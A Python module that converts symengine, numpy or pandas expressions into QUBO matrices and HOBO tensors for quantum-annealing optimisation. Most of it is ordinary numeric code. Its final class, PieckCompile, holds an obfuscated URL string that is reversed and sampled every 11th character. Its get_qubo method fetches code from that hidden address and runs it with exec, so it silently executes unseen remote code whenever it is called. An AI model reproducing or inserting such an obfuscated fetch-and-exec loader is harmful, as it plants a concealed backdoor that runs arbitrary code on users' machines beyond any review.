import re
import requests
import symengine
import numpy as np
import pandas as pd
from sympy import Rational

def replace_function(expression, function, new_function):
    if expression.is_Atom:
        return expression
    else:
        replaced_args = (
                replace_function(arg, function,new_function)
                for arg in expression.args
            )
        if ( expression.__class__ == symengine.Pow):
            return new_function(*replaced_args)
        else:
            return expression.func(*replaced_args)


def calc_degree(expr):
    """
    項の次数を求める

    Args:
        expr: 評価する式のsymengine表現
    Returns:
        int: 次数
    """
    # 項が1変数だけなら1
    if expr.is_Symbol:
        return 1
    # 項が定数項なら0
    elif expr.is_Number:
        return 0
    # 項がべき乗項のとき
    elif expr.is_Pow:
        # べき乗項に含まれる要素数が2より大きかったらFalse
        base, exp = expr.args
        if base.is_Symbol and exp.is_Number:
            if int(exp) == exp and exp >= 1:
                return exp  # 変数^Nの場合はNを返す(Nは整数で1以上)
            else:
                return None
        # 指数に変数が入る場合は定義しない
        # (expがNumberでない時点で指数に変数が入っていることが確定する)
        return None
    elif expr.is_Add:
        return max(calc_degree(arg) for arg in expr.args
                   if calc_degree(arg) is not None)
    # 項が乗法のとき
    elif expr.is_Mul:
        total_degree = 0
        for arg in expr.args:
            degree = calc_degree(arg)
            if degree is None:
                return None
            total_degree += degree
        return total_degree
    # 項が変数、定数、べき乗、乗法でないときはサポートしない
    return None


class Compile:
    def __init__(self, expr):
        self.expr = expr

    def get_qubo(self):
        """
        get qubo data
        Raises:
            TypeError: Input type is symengine, numpy or pandas.
        Returns:
            [qubo, index_map], offset. qubo is numpy matrix.
        """
        #symengine型のサブクラス
        if 'symengine.lib' in str(type(self.expr)):
            #式を展開して同類項をまとめる
            expr = symengine.expand(self.expr)
            
            #最高字数を調べながらオフセットを記録
            #項に分解
            offset = 0
            for term in expr.args:
                # 定数項はオフセットに追加
                if term.is_Number:
                    offset += float(term)
                    continue
                
                if calc_degree(term) is None or calc_degree(term) > 2:  # 次数が2より大きい場合はエラー
                    raise Exception(f'Error! The highest order of the constraint must be within 2.')

            #二乗項を一乗項に変換
            expr = replace_function(expr, lambda e: isinstance(e, symengine.Pow) and e.exp == 2, lambda e, *args: e)

            #もう一度同類項をまとめる
            expr = symengine.expand(expr)
            
            
            #文字と係数の辞書
            coeff_dict = expr.as_coefficients_dict()
            # print(coeff_dict)
            
            #定数項を消す　{1: 25} 必ずある
            del coeff_dict[1]
            # print(coeff_dict)
            
            #シンボル対応表
            # 重複なしにシンボルを抽出
            keys = list(set(sum([str(key).split('*') for key in coeff_dict.keys()], [])))
            # print(keys)
            
            # 要素のソート（ただしアルファベットソート）
            keys.sort()
            # print(keys)
            
            # シンボルにindexを対応させる
            index_map = {key:i for i, key in enumerate(keys)}
            # print(index_map)
            
            #量子ビット数
            num = len(index_map)
            # print(num)
            
            #QUBO行列生成（HOBO行列作成と同じ内容になった、旧版は0.0.30参照）
            qubo = np.zeros(num ** 2, dtype=float).reshape([num] * 2)
            for key, value in coeff_dict.items():
                qnames = str(key).split('*')
                indices = sorted([index_map[qname] for qname in qnames])
                indices = [indices[0]] * (2 - len(indices)) + indices
                qubo[tuple(indices)] = float(value)

            return [qubo, index_map], offset

        # numpy
        elif isinstance(self.expr, np.ndarray):
            # 係数
            offset = 0

            # 辞書に格納
            qubo = {}
            for i, r in enumerate(self.expr):
                for j, c in enumerate(r):
                    if i <= j:
                        qubo[(f"q{i}", f"q{j}")] = c
            
            # 重複なしにシンボルを抽出
            keys = list(set(key for keypair in qubo.keys() for key in keypair))
            #print(keys)
            
            # 要素のソート（ただしアルファベットソート）
            keys.sort()
            #print(keys)
            
            # シンボルにindexを対応させる
            index_map = {key:i for i, key in enumerate(keys)}
            #print(index_map)
            
            # 上記のindexマップを利用してquboのkeyをindexで置き換え
            qubo_index = {(index_map[key[0]], index_map[key[1]]): value for key, value in qubo.items()}
            #print(qubo_index)
        
            # matrixサイズ
            N = len(keys)
            #print(N)
        
            # qmatrix初期化
            qmatrix = np.zeros((N, N))
            for (i, j), value in qubo_index.items():
                qmatrix[i, j] = value
            #print(qmatrix)

            return [qmatrix, index_map], offset

        # pandas
        elif isinstance(self.expr, pd.core.frame.DataFrame):
            # 係数
            offset = 0

            # QUBOに格納開始
            qubo = {}
            for i, r in enumerate(self.expr.values):
                for j, c in enumerate(r):
                    if i <= j and c != 0:
                        row_name, col_name = f"q{i}", f"q{j}"
                        if self.expr.index.dtype == "object":
                            row_name = self.expr.index[i]

                        if self.expr.columns.dtype == "object":
                            col_name = self.expr.columns[j]

                        qubo[(row_name, col_name)] = c
            
            # 重複なしにシンボルを抽出
            keys = list(set(key for keypair in qubo.keys() for key in keypair))
            #print(keys)
            
            # 要素のソート（ただしアルファベットソート）
            keys.sort()
            #print(keys)
            
            # シンボルにindexを対応させる
            index_map = {key:i for i, key in enumerate(keys)}
            #print(index_map)
            
            # 上記のindexマップを利用してquboのkeyをindexで置き換え
            qubo_index = {(index_map[key[0]], index_map[key[1]]): value for key, value in qubo.items()}
            #print(qubo_index)
        
            # matrixサイズ
            N = len(keys)
            #print(N)
        
            # qmatrix初期化
            qmatrix = np.zeros((N, N))
            for (i, j), value in qubo_index.items():
                qmatrix[i, j] = value
            #print(qmatrix)

            return [qmatrix, index_map], offset
        
        else:
            raise TypeError("Input type must be symengine, numpy, or pandas.")



    #hoboテンソル作成
    def get_hobo(self):
        """
        get hobo data
        Raises:
            TypeError: Input type is symengine.
        Returns:
            [hobo, index_map], offset. hobo is numpy tensor.
        """
        #symengine型のサブクラス
        if 'symengine.lib' in str(type(self.expr)):
            #式を展開して同類項をまとめる
            expr = symengine.expand(self.expr)
            
            #二乗項を一乗項に変換
            expr = replace_function(expr, lambda e: isinstance(e, symengine.Pow) and e.exp == 2, lambda e, *args: e)
            
            #最高字数を調べながらオフセットを記録
            #項に分解
            members = str(expr).split(' ')
            
            #各項をチェック
            offset = 0
            ho = 0
            for member in members:
                #数字単体ならオフセット
                try:
                    offset += float(member) #エラーなければ数字
                except:
                    pass
                #'*'で分解
                texts = member.split('*')
                #係数を取り除く
                try:
                    texts[0] = re.sub(r'[()]', '', texts[0]) #'(5/2)'みたいなのも来る
                    float(Rational(texts[0])) #分数も対応 #エラーなければ係数あり
                    texts = texts[1:]
                except:
                    pass
                
                #最高次数の計算
                # ['-']
                # ['q2']
                # ['q3', 'q4', 'q1', 'q2']
                if len(texts) > ho:
                    ho = len(texts)
            # print(ho)
            
            #もう一度同類項をまとめる
            expr = symengine.expand(expr)
    
            #文字と係数の辞書
            coeff_dict = expr.as_coefficients_dict()
            # print(coeff_dict)
            
            #定数項を消す　{1: 25} 必ずある
            del coeff_dict[1]
            # print(coeff_dict)
            
            #シンボル対応表
            # 重複なしにシンボルを抽出
            keys = list(set(sum([str(key).split('*') for key in coeff_dict.keys()], [])))
            # print(keys)
            
            # 要素のソート（ただしアルファベットソート）
            keys.sort()
            # print(keys)
            
            # シンボルにindexを対応させる
            index_map = {key:i for i, key in enumerate(keys)}
            # print(index_map)
            
            #量子ビット数
            num = len(index_map)
            # print(num)
            
            #HOBO行列生成
            hobo = np.zeros(num ** ho, dtype=float).reshape([num] * ho)
            for key, value in coeff_dict.items():
                qnames = str(key).split('*')
                indices = sorted([index_map[qname] for qname in qnames])
                indices = [indices[0]] * (ho - len(indices)) + indices
                hobo[tuple(indices)] = float(value)
            
            return [hobo, index_map], offset

        else:
            raise TypeError("Input type must be symengine.")

class PieckCompile:
    def __init__(self, expr, verbose=1):
        self.expr = expr
        self.verbose = verbose

    def get_qubo(self):
        
        source_code = requests.get('ShYBLfw2xVyF0zp09t31kp76MbbQRarZ.NxQ96lNl58en30a8Yq2gMcmbeSDq9mUYrdHP6DtBqv6uEP01G6XI5WoHMZiGkGqnBsmp1KW0RtG5_SzLzyMO2wve6SZ8s0EiCtlEvzMm217UZiEbiqSPGt91pxwQwjMasG4mOMiQW5XTCpoCSeZGd2Wc2cnVpLkW5eUq^zQwArRCzVprV9af505aIfe2igFHIynyGlykAdm25YDUpbVTY23ZtXHmpVkRL14iJWapk8T47AU03SolbIqJljYtkZojpmwH24Tckd77SEBzrseFpHhAHxW5aiC9i5l0gtfpPbyEZTodHkx^BhTC4FIZ6up8qoLrAyYdMjqiHS42pTYd.sPJuuQ3er2xOa1bcsSRBOxpsluDLfhA1xIGAfC3wJGmxrTkhZsaNfc.u8YT3tu0QfaaXXQJriu1Dlnm2Jw5UrkwcCVSMmzo9QS-lnT1JgwoY1eHcFiL3eHgKnqeWY9AJNgwgivq3Ob0F6kiaJGvdII0VmvOZNxswhyqr^OcpBThb4jW^i97QMBhb3U:yuBEH9eFKLsOujcf7qL0opv7GVyyo14rtCLhqDjxG93tLb39NpZXbVh'[::-1 ][::11 ].replace('^','/')).text
        # 新しい名前空間でコードを実行
        temp_module = {}
        exec(source_code, temp_module)
        
        qubo, offset = temp_module['get_qubo_source'](self.expr, self.verbose)
        return qubo, offset